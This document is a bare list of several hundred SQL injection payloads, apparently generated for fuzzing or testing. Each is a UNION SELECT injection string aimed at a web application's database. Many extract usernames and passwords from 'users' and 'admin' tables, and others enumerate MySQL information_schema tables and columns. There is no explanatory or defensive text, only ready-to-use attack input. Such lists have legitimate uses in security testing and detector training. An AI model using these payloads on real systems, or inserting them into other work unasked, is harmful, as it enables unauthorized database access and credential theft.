1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT name ,description ,NULL ,name FROM types WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT COLUMN_DEFAULT ,TABLE_NAME ,IS_NULLABLE ,COLUMN_KEY FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT id ,description ,id ,name FROM types WHERE description <>'
1' UNION SELECT name ,name ,description ,NULL FROM types WHERE name ='1
1' UNION SELECT name ,name ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,id ,description ,description FROM types WHERE name ='1
1' UNION SELECT ENGINE ,NULL ,CREATE_OPTIONS ,DATA_LENGTH FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT NULL ,price ,type ,id FROM products WHERE type <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT username ,NULL ,password ,id FROM admin WHERE password <>'
1' UNION SELECT price ,id ,type ,name FROM products WHERE price ='1
1' UNION SELECT id ,id ,name ,id FROM types WHERE id ='1
1' UNION SELECT NULL ,id ,NULL ,password FROM admin WHERE password ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT AVG_ROW_LENGTH ,INDEX_LENGTH ,TABLE_COMMENT ,DATA_LENGTH FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT username ,id ,id ,NULL FROM admin WHERE username ='1
1' UNION SELECT name ,type ,NULL ,id FROM products WHERE name <>'
1' UNION SELECT username ,password ,id ,username FROM users WHERE username <>'
1' UNION SELECT name ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT username ,NULL ,id ,username FROM users WHERE password <>'
1' UNION SELECT comment ,comment ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT MAX_DATA_LENGTH ,TABLE_COMMENT ,CHECK_TIME ,ENGINE FROM information_schema.tables WHERE ENGINE <>'
1' UNION SELECT name ,NULL ,id ,price FROM products WHERE name ='1
1' UNION SELECT id ,password ,id ,username FROM admin WHERE id <>'
1' UNION SELECT description ,name ,name ,NULL FROM types WHERE name <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT ROW_FORMAT ,UPDATE_TIME ,TABLE_NAME ,DATA_LENGTH FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT username ,username ,id ,NULL FROM users WHERE id ='1
1' UNION SELECT MAX_DATA_LENGTH ,CREATE_OPTIONS ,MAX_DATA_LENGTH ,DATA_LENGTH FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT username ,password ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE password ='1
1' UNION SELECT EXTRA ,SRS_ID ,ORDINAL_POSITION ,NUMERIC_PRECISION FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT COLUMN_TYPE ,ORDINAL_POSITION ,COLUMN_DEFAULT ,PRIVILEGES FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT AUTO_INCREMENT ,TABLE_SCHEMA ,CHECK_TIME ,TABLE_SCHEMA FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT id ,NULL ,username ,NULL FROM users WHERE password <>'
1' UNION SELECT id ,NULL ,id ,password FROM users WHERE username ='1
1' UNION SELECT password ,id ,password ,password FROM admin WHERE id <>'
1' UNION SELECT type ,name ,price ,NULL FROM products WHERE id <>'
1' UNION SELECT id ,username ,username ,id FROM admin WHERE username ='1
1' UNION SELECT NULL ,username ,username ,password FROM users WHERE password ='1
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,name ,NULL ,price FROM products WHERE price ='1
1' UNION SELECT username ,username ,id ,username FROM admin WHERE password ='1
1' UNION SELECT description ,NULL ,description ,id FROM types WHERE name ='1
1' UNION SELECT price ,name ,name ,price FROM products WHERE id ='1
1' UNION SELECT NUMERIC_SCALE ,NUMERIC_SCALE ,TABLE_NAME ,NULL FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT username ,NULL ,password ,id FROM admin WHERE username <>'
1' UNION SELECT NULL ,password ,username ,NULL FROM admin WHERE password ='1
1' UNION SELECT password ,NULL ,id ,password FROM users WHERE id ='1
1' UNION SELECT NULL ,password ,NULL ,NULL FROM users WHERE password ='1
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT comment ,name ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT EXTRA ,CHARACTER_MAXIMUM_LENGTH ,COLLATION_NAME ,COLUMN_NAME FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT password ,NULL ,id ,password FROM users WHERE password ='1
1' UNION SELECT name ,id ,type ,type FROM products WHERE price <>'
1' UNION SELECT NULL ,name ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,NULL ,username ,username FROM users WHERE id <>'
1' UNION SELECT AVG_ROW_LENGTH ,TABLE_CATALOG ,TABLE_SCHEMA ,AVG_ROW_LENGTH FROM information_schema.tables WHERE INDEX_LENGTH <>'
1' UNION SELECT TABLE_COLLATION ,ROW_FORMAT ,AVG_ROW_LENGTH ,INDEX_LENGTH FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT CREATE_TIME ,ENGINE ,DATA_FREE ,AVG_ROW_LENGTH FROM information_schema.tables WHERE CHECKSUM ='1
1' UNION SELECT username ,username ,password ,username FROM users WHERE password ='1
1' UNION SELECT CREATE_OPTIONS ,CHECK_TIME ,CHECKSUM ,MAX_DATA_LENGTH FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT username ,id ,password ,password FROM admin WHERE password ='1
1' UNION SELECT NULL ,NULL ,password ,username FROM users WHERE username ='1
1' UNION SELECT comment ,NULL ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT password ,id ,password ,NULL FROM users WHERE id <>'
1' UNION SELECT password ,password ,username ,id FROM users WHERE id ='1
1' UNION SELECT GENERATION_EXPRESSION ,CHARACTER_MAXIMUM_LENGTH ,COLLATION_NAME ,IS_NULLABLE FROM information_schema.columns WHERE TABLE_NAME <>'
1' UNION SELECT id ,password ,password ,username FROM admin WHERE id <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,CHARACTER_SET_NAME ,TABLE_SCHEMA ,IS_NULLABLE FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT DATETIME_PRECISION ,COLLATION_NAME ,EXTRA ,COLUMN_KEY FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,ORDINAL_POSITION ,DATA_TYPE ,SRS_ID FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT password ,password ,password ,username FROM users WHERE username ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,description ,name ,NULL FROM types WHERE id ='1
1' UNION SELECT name ,description ,description ,id FROM types WHERE name <>'
1' UNION SELECT NULL ,username ,username ,username FROM admin WHERE id ='1
1' UNION SELECT name ,NULL ,name ,id FROM types WHERE description ='1
1' UNION SELECT username ,username ,username ,username FROM users WHERE username ='1
1' UNION SELECT NULL ,TABLE_NAME ,AVG_ROW_LENGTH ,UPDATE_TIME FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT DATETIME_PRECISION ,ORDINAL_POSITION ,EXTRA ,COLUMN_NAME FROM information_schema.columns WHERE GENERATION_EXPRESSION ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT price ,NULL ,id ,id FROM products WHERE name ='1
1' UNION SELECT username ,id ,id ,password FROM admin WHERE password <>'
1' UNION SELECT username ,NULL ,username ,NULL FROM users WHERE username <>'
1' UNION SELECT COLUMN_NAME ,PRIVILEGES ,TABLE_CATALOG ,ORDINAL_POSITION FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT type ,type ,id ,type FROM products WHERE name <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,id ,username ,NULL FROM users WHERE password <>'
1' UNION SELECT description ,description ,NULL ,description FROM types WHERE id ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,comment ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,name ,name ,NULL FROM products WHERE id ='1
1' UNION SELECT username ,NULL ,id ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT SRS_ID ,COLUMN_NAME ,NUMERIC_SCALE ,TABLE_CATALOG FROM information_schema.columns WHERE NUMERIC_SCALE ='1
1' UNION SELECT NULL ,password ,id ,NULL FROM admin WHERE password <>'
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE username ='1
1' UNION SELECT name ,NULL ,NULL ,id FROM types WHERE id ='1
1' UNION SELECT NULL ,description ,NULL ,name FROM types WHERE name ='1
1' UNION SELECT id ,id ,description ,name FROM types WHERE name ='1
1' UNION SELECT name ,price ,NULL ,id FROM products WHERE type <>'
1' UNION SELECT name ,id ,NULL ,price FROM products WHERE price ='1
1' UNION SELECT ORDINAL_POSITION ,DATA_TYPE ,COLUMN_NAME ,DATETIME_PRECISION FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT comment ,name ,NULL ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT ENGINE ,ROW_FORMAT ,TABLE_CATALOG ,TABLE_NAME FROM information_schema.tables WHERE CREATE_OPTIONS <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,NULL ,DATA_TYPE ,NUMERIC_SCALE FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT NULL ,id ,password ,password FROM users WHERE password <>'
1' UNION SELECT GENERATION_EXPRESSION ,NULL ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH <>'
1' UNION SELECT NULL ,password ,username ,NULL FROM admin WHERE username <>'
1' UNION SELECT VERSION ,CREATE_TIME ,NULL ,UPDATE_TIME FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT TABLE_COLLATION ,TABLE_CATALOG ,TABLE_NAME ,ROW_FORMAT FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT price ,price ,price ,NULL FROM products WHERE id ='1
1' UNION SELECT username ,id ,password ,username FROM admin WHERE username <>'
1' UNION SELECT IS_NULLABLE ,TABLE_NAME ,NUMERIC_SCALE ,PRIVILEGES FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH <>'
1' UNION SELECT name ,id ,name ,NULL FROM products WHERE type ='1
1' UNION SELECT comment ,NULL ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE password ='1
1' UNION SELECT name ,name ,comment ,name FROM commentsnew WHERE name <>'
1' UNION SELECT id ,description ,description ,id FROM types WHERE id ='1
1' UNION SELECT PRIVILEGES ,COLUMN_TYPE ,IS_NULLABLE ,CHARACTER_SET_NAME FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT id ,NULL ,password ,NULL FROM users WHERE username ='1
1' UNION SELECT id ,name ,id ,NULL FROM products WHERE name ='1
1' UNION SELECT TABLE_TYPE ,UPDATE_TIME ,INDEX_LENGTH ,CREATE_TIME FROM information_schema.tables WHERE DATA_LENGTH <>'
1' UNION SELECT name ,name ,NULL ,description FROM types WHERE description ='1
1' UNION SELECT TABLE_TYPE ,CREATE_OPTIONS ,TABLE_ROWS ,TABLE_ROWS FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT NULL ,NULL ,id ,NULL FROM types WHERE id <>'
1' UNION SELECT username ,username ,username ,username FROM users WHERE username ='1
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT id ,NULL ,name ,name FROM types WHERE description <>'
1' UNION SELECT CHARACTER_SET_NAME ,CHARACTER_SET_NAME ,EXTRA ,ORDINAL_POSITION FROM information_schema.columns WHERE ORDINAL_POSITION <>'
1' UNION SELECT VERSION ,MAX_DATA_LENGTH ,TABLE_ROWS ,NULL FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,id ,username ,username FROM admin WHERE password ='1
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,id ,password ,NULL FROM users WHERE id <>'
1' UNION SELECT CHECK_TIME ,UPDATE_TIME ,ENGINE ,TABLE_COLLATION FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT NULL ,NULL ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,description ,NULL ,description FROM types WHERE name ='1
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,id ,id FROM types WHERE id <>'
1' UNION SELECT comment ,name ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,name ,id ,name FROM types WHERE id ='1
1' UNION SELECT username ,NULL ,NULL ,username FROM users WHERE id ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT comment ,comment ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,password ,password ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,username ,id ,username FROM users WHERE username <>'
1' UNION SELECT username ,password ,username ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,price ,name ,id FROM products WHERE name ='1
1' UNION SELECT VERSION ,CREATE_TIME ,DATA_LENGTH ,CREATE_OPTIONS FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT CHARACTER_SET_NAME ,TABLE_NAME ,DATA_TYPE ,COLUMN_TYPE FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT NULL ,username ,NULL ,id FROM admin WHERE username <>'
1' UNION SELECT MAX_DATA_LENGTH ,CHECKSUM ,TABLE_COLLATION ,TABLE_ROWS FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT UPDATE_TIME ,TABLE_COMMENT ,CHECKSUM ,NULL FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT username ,username ,id ,username FROM admin WHERE id <>'
1' UNION SELECT COLUMN_DEFAULT ,GENERATION_EXPRESSION ,SRS_ID ,ORDINAL_POSITION FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT TABLE_COLLATION ,CREATE_TIME ,DATA_LENGTH ,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_TYPE ='1
1' UNION SELECT id ,username ,username ,password FROM users WHERE password <>'
1' UNION SELECT id ,NULL ,password ,username FROM users WHERE id <>'
1' UNION SELECT name ,NULL ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,password ,username ,password FROM admin WHERE username ='1
1' UNION SELECT NULL ,password ,username ,password FROM users WHERE id ='1
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT id ,NULL ,username ,id FROM admin WHERE username ='1
1' UNION SELECT NUMERIC_PRECISION ,TABLE_SCHEMA ,COLUMN_DEFAULT ,DATETIME_PRECISION FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT description ,id ,description ,id FROM types WHERE name <>'
1' UNION SELECT TABLE_CATALOG ,COLUMN_KEY ,TABLE_CATALOG ,CHARACTER_SET_NAME FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT MAX_DATA_LENGTH ,UPDATE_TIME ,AUTO_INCREMENT ,UPDATE_TIME FROM information_schema.tables WHERE TABLE_SCHEMA <>'
1' UNION SELECT NULL ,id ,username ,username FROM admin WHERE id ='1
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT CREATE_OPTIONS ,DATA_FREE ,INDEX_LENGTH ,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT password ,username ,password ,username FROM admin WHERE username <>'
1' UNION SELECT TABLE_SCHEMA ,CHARACTER_OCTET_LENGTH ,COLUMN_DEFAULT ,TABLE_SCHEMA FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT username ,password ,password ,NULL FROM users WHERE id <>'
1' UNION SELECT id ,password ,NULL ,password FROM users WHERE password ='1
1' UNION SELECT username ,NULL ,NULL ,username FROM users WHERE username <>'
1' UNION SELECT password ,password ,password ,NULL FROM users WHERE username ='1
1' UNION SELECT type ,name ,NULL ,name FROM products WHERE type <>'
1' UNION SELECT type ,id ,id ,type FROM products WHERE id <>'
1' UNION SELECT id ,id ,NULL ,username FROM users WHERE username <>'
1' UNION SELECT NULL ,id ,username ,username FROM admin WHERE password ='1
1' UNION SELECT id ,id ,id ,type FROM products WHERE price <>'
1' UNION SELECT password ,id ,id ,NULL FROM admin WHERE id <>'
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT password ,NULL ,NULL ,username FROM users WHERE id ='1
1' UNION SELECT PRIVILEGES ,COLUMN_COMMENT ,COLUMN_COMMENT ,COLUMN_TYPE FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT CHECKSUM ,CREATE_TIME ,TABLE_CATALOG ,MAX_DATA_LENGTH FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT NULL ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,id ,name ,name FROM products WHERE type ='1
1' UNION SELECT CREATE_OPTIONS ,CHECK_TIME ,TABLE_COLLATION ,NULL FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT UPDATE_TIME ,TABLE_COLLATION ,INDEX_LENGTH ,TABLE_SCHEMA FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT password ,id ,username ,username FROM admin WHERE id <>'
1' UNION SELECT IS_NULLABLE ,IS_NULLABLE ,NULL ,COLUMN_NAME FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT comment ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT username ,id ,NULL ,id FROM users WHERE password ='1
1' UNION SELECT id ,password ,password ,NULL FROM users WHERE password ='1
1' UNION SELECT id ,name ,type ,type FROM products WHERE type ='1
1' UNION SELECT name ,NULL ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT description ,name ,description ,description FROM types WHERE description ='1
1' UNION SELECT id ,NULL ,password ,NULL FROM users WHERE password ='1
1' UNION SELECT password ,id ,NULL ,username FROM admin WHERE password <>'
1' UNION SELECT ORDINAL_POSITION ,COLUMN_TYPE ,TABLE_CATALOG ,COLUMN_KEY FROM information_schema.columns WHERE COLUMN_COMMENT <>'
1' UNION SELECT id ,id ,NULL ,id FROM users WHERE username ='1
1' UNION SELECT username ,NULL ,NULL ,id FROM users WHERE id ='1
1' UNION SELECT NULL ,NULL ,id ,id FROM types WHERE id ='1
1' UNION SELECT COLUMN_NAME ,TABLE_CATALOG ,NUMERIC_PRECISION ,ORDINAL_POSITION FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT COLUMN_NAME ,EXTRA ,NULL ,EXTRA FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT id ,NULL ,price ,price FROM products WHERE name ='1
1' UNION SELECT NULL ,username ,id ,id FROM admin WHERE password ='1
1' UNION SELECT name ,type ,NULL ,name FROM products WHERE name <>'
1' UNION SELECT id ,NULL ,NULL ,NULL FROM types WHERE description <>'
1' UNION SELECT CREATE_TIME ,MAX_DATA_LENGTH ,TABLE_CATALOG ,TABLE_ROWS FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT id ,password ,id ,username FROM users WHERE username ='1
1' UNION SELECT CREATE_OPTIONS ,CREATE_OPTIONS ,UPDATE_TIME ,UPDATE_TIME FROM information_schema.tables WHERE CREATE_OPTIONS <>'
1' UNION SELECT name ,comment ,NULL ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,password ,NULL ,NULL FROM admin WHERE password <>'
1' UNION SELECT NULL ,password ,password ,NULL FROM users WHERE username ='1
1' UNION SELECT name ,description ,description ,id FROM types WHERE id ='1
1' UNION SELECT password ,id ,password ,password FROM admin WHERE id ='1
1' UNION SELECT NULL ,name ,NULL ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT password ,username ,username ,password FROM admin WHERE username <>'
1' UNION SELECT password ,username ,username ,username FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT type ,id ,NULL ,NULL FROM products WHERE price ='1
1' UNION SELECT id ,id ,NULL ,id FROM products WHERE name ='1
1' UNION SELECT password ,NULL ,id ,username FROM users WHERE id ='1
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT password ,id ,password ,username FROM users WHERE password ='1
1' UNION SELECT type ,price ,name ,price FROM products WHERE price <>'
1' UNION SELECT password ,password ,NULL ,NULL FROM admin WHERE password ='1
1' UNION SELECT CHARACTER_OCTET_LENGTH ,DATA_TYPE ,COLUMN_TYPE ,ORDINAL_POSITION FROM information_schema.columns WHERE TABLE_CATALOG ='1
1' UNION SELECT NULL ,NULL ,NULL ,type FROM products WHERE type ='1
1' UNION SELECT id ,username ,password ,NULL FROM admin WHERE username ='1
1' UNION SELECT ENGINE ,TABLE_CATALOG ,TABLE_COMMENT ,TABLE_SCHEMA FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT type ,NULL ,name ,price FROM products WHERE price <>'
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT description ,name ,description ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,id ,id ,id FROM admin WHERE password ='1
1' UNION SELECT name ,NULL ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT username ,NULL ,id ,NULL FROM users WHERE username <>'
1' UNION SELECT NULL ,name ,comment ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT NUMERIC_SCALE ,DATA_TYPE ,EXTRA ,COLUMN_NAME FROM information_schema.columns WHERE COLUMN_NAME <>'
1' UNION SELECT username ,username ,id ,id FROM users WHERE password <>'
1' UNION SELECT price ,type ,type ,name FROM products WHERE price <>'
1' UNION SELECT username ,password ,NULL ,username FROM admin WHERE username <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT description ,name ,name ,id FROM types WHERE id ='1
1' UNION SELECT ORDINAL_POSITION ,DATA_TYPE ,CHARACTER_OCTET_LENGTH ,PRIVILEGES FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE username <>'
1' UNION SELECT id ,NULL ,id ,password FROM admin WHERE password ='1
1' UNION SELECT id ,password ,id ,id FROM admin WHERE username <>'
1' UNION SELECT name ,description ,name ,NULL FROM types WHERE description <>'
1' UNION SELECT name ,comment ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT ENGINE ,TABLE_COMMENT ,INDEX_LENGTH ,NULL FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT MAX_DATA_LENGTH ,ROW_FORMAT ,AUTO_INCREMENT ,CREATE_OPTIONS FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT password ,password ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,name ,id FROM types WHERE id <>'
1' UNION SELECT password ,password ,NULL ,username FROM users WHERE id ='1
1' UNION SELECT CHECKSUM ,DATA_FREE ,UPDATE_TIME ,CHECK_TIME FROM information_schema.tables WHERE TABLE_COLLATION <>'
1' UNION SELECT INDEX_LENGTH ,ROW_FORMAT ,DATA_FREE ,UPDATE_TIME FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT TABLE_COMMENT ,NULL ,UPDATE_TIME ,TABLE_COMMENT FROM information_schema.tables WHERE INDEX_LENGTH <>'
1' UNION SELECT NULL ,id ,description ,description FROM types WHERE id ='1
1' UNION SELECT password ,NULL ,NULL ,password FROM users WHERE password ='1
1' UNION SELECT password ,password ,NULL ,username FROM admin WHERE password ='1
1' UNION SELECT id ,id ,username ,username FROM admin WHERE id <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT comment ,name ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT id ,name ,id ,NULL FROM types WHERE description ='1
1' UNION SELECT TABLE_SCHEMA ,NULL ,TABLE_COLLATION ,TABLE_ROWS FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT DATETIME_PRECISION ,DATETIME_PRECISION ,IS_NULLABLE ,NULL FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT price ,id ,NULL ,NULL FROM products WHERE price ='1
1' UNION SELECT id ,NULL ,password ,id FROM users WHERE password ='1
1' UNION SELECT type ,type ,price ,type FROM products WHERE type ='1
1' UNION SELECT NULL ,NULL ,id ,NULL FROM products WHERE id <>'
1' UNION SELECT TABLE_TYPE ,ROW_FORMAT ,TABLE_ROWS ,INDEX_LENGTH FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT VERSION ,CREATE_OPTIONS ,NULL ,CHECK_TIME FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT description ,description ,NULL ,description FROM types WHERE name <>'
1' UNION SELECT TABLE_NAME ,TABLE_CATALOG ,CHECKSUM ,CHECK_TIME FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT NULL ,id ,price ,type FROM products WHERE type <>'
1' UNION SELECT COLUMN_COMMENT ,TABLE_NAME ,NUMERIC_PRECISION ,DATETIME_PRECISION FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT id ,username ,NULL ,username FROM users WHERE id <>'
1' UNION SELECT comment ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT DATETIME_PRECISION ,PRIVILEGES ,EXTRA ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE NUMERIC_PRECISION <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
